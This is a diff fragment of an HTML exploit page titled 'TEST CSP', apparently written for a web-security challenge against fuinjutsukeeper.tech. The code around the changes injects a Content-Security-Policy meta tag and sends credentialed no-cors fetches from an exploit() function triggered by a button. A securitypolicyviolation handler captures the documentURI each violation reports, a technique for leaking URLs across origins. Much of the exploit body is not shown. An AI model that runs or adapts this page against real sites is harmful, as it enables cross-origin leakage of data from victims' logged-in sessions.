@@ -3,7 +3,7 @@
   <title>TEST CSP</title>
   </head>
 <script>
-  window.addEventListener('DOMContentLoaded', e => {
+  
       const meta = document.createElement('meta');
       meta.httpEquiv = 'Content-Security-Policy';
       meta.content = `default-src 'self' 'unsafe-inline' http://fuinjutsukeeper.tech`;
@@ -19,6 +19,7 @@ function exploit() {
             fetch(url, {mode: 'no-cors', credentials: 'include'});
           }
         }, 5000);
+}
   
   const HandleViolation = e => {
         const document_uri = e.documentURI;
@@ -26,7 +27,7 @@ function exploit() {
       }
   
   window.addEventListener('securitypolicyviolation', HandleViolation);
-}
+
 </script>
   <body>
   <button onclick="exploit()"></button>
